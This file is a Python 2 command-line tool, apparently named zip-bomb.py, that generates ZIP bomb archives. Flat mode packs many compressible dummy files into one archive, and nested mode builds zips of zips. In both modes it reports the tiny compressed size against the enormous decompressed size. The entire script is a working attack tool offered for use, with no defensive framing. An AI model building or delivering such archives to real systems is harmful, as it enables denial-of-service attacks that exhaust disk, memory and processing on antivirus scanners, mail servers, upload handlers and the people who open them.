import zlib
import zipfile
import math
import os
import shutil
import sys
import time

	
def generate_dummy_file(filename, size):
	with open(filename,'w') as dummy:
		dummy.write((size*1024*1024)*'0')

	
def make_copies_and_compress(infile, outfile, n_copies):
	zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
	for i in xrange(n_copies):
		extension = infile[infile.rfind('.')+1:]
		basename = infile[:infile.rfind('.')]
		f_name = '%s-%d.%s' % (basename,i,extension)
		shutil.copy(infile,f_name)
		zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
		os.remove(f_name)
	zf.close()
	
	
def make_zip_flat(size, out_file):
	"""
	Creates flat zip file without nested zips.
	Zip contains n files each of size size/n and is saved in out_file.
	"""
	dummy_name_format = 'dummy{}.txt'
		
	files_nb = size / 100
	file_size = size / files_nb
	last_file_size = size - (file_size * files_nb)
	
	if os.path.isfile(out_zip_file):
		os.remove(out_zip_file)
		
	zf = zipfile.ZipFile(out_file, mode='w', allowZip64=True)
	if files_nb > 0:
		for i in range(files_nb):
			dummy_name = dummy_name_format.format(i)
			if i == 0:
				generate_dummy_file(dummy_name, file_size)
			else:
				os.rename(dummy_name_format.format(i-1), dummy_name)
			zf.write(dummy_name, compress_type=zipfile.ZIP_DEFLATED)
		os.remove(dummy_name)
	
	if last_file_size > 0:
		dummy_name = dummy_name_format.format(files_nb)
		generate_dummy_file(dummy_name, last_file_size)
		zf.write(dummy_name, compress_type=zipfile.ZIP_DEFLATED)
		os.remove(dummy_name)
	zf.close()
	return files_nb * file_size
	

def get_files_depth_and_size(total_size):
	""" 
	Finds a pair of files depth and file size close to given size.
	Idea is to keep both values balanced so there is no situation 
	in which there is gazillion files of size 2MB or one file of 1TB
	"""
	files_nb = 1
	file_size = 10
	actual_size = files_nb**files_nb * file_size
	while actual_size < total_size:
		# depth
		inc_files_nb = files_nb + 1
		if inc_files_nb**inc_files_nb * file_size < total_size:
			files_nb = inc_files_nb
		# file size
		new_file_size = total_size / (files_nb**files_nb)
		if new_file_size > 2 * file_size:
			file_size *= 2
		elif new_file_size == file_size:
			file_size += 1
		else:
			file_size = new_file_size
		actual_size = files_nb**files_nb * file_size
	return files_nb, file_size
		
	
def make_zip_nested(size_MB, out_zip_file):
	"""
	Creates nested zip file (zip file of zip files of zip files etc.).
	"""
	if size_MB < 500:
		print 'Warning: too small size, using flat mode.'
		return make_zip_flat(size_MB, out_zip_file)
	
	depth, file_size = get_files_depth_and_size(size_MB)
	actual_size = depth**depth*file_size 
	print 'Warning: Using nested mode. Actual size may differ from given.'
	
	dummy_name = 'dummy.txt'
	generate_dummy_file(dummy_name, file_size)
	zf = zipfile.ZipFile('1.zip', mode='w', allowZip64= True)
	zf.write(dummy_name, compress_type=zipfile.ZIP_DEFLATED)
	zf.close()
	os.remove(dummy_name)
	
	for i in xrange(1,depth+1):
		make_copies_and_compress('%d.zip'%i,'%d.zip'%(i+1),depth)
		os.remove('%d.zip'%i)
	if os.path.isfile(out_zip_file):
		os.remove(out_zip_file)
	os.rename('%d.zip'%(depth+1),out_zip_file)
	return actual_size
	
def usage():
	print 'Usage: zip-bomb.py <mode> <size> <out_zip_file>'
	print 
	print 'Creates ZIP bomb archive'
	print
	print '<mode> - mode of compression'
	print '  nested - nested zip file (zip file of zip files of ...)'
	print '  flat   - flat file without nested zips'
	print '<size> - decompression size in MB'
	print '<out_zip_file> - path to destination file'
	exit(1)
	
	
if __name__ == '__main__':
	
	if len(sys.argv) < 4:
		usage()
	
	mode = sys.argv[1]
	size_MB = int(sys.argv[2])
	out_zip_file = sys.argv[3]
	
	if mode not in ['nested', 'flat']:
		usage()
	start_time = time.time()
	if mode == 'flat':
		actual_size = make_zip_flat(size_MB, out_zip_file)
	elif mode == 'nested':
		actual_size = make_zip_nested(size_MB, out_zip_file)
	else:
		usage()
	end_time = time.time()
	print 'Compressed File Size: %.2f KB'%(os.stat(out_zip_file).st_size/1024.0)
	print 'Size After Decompression: %d MB'%actual_size
	print 'Generation Time: %.2fs'%(end_time - start_time)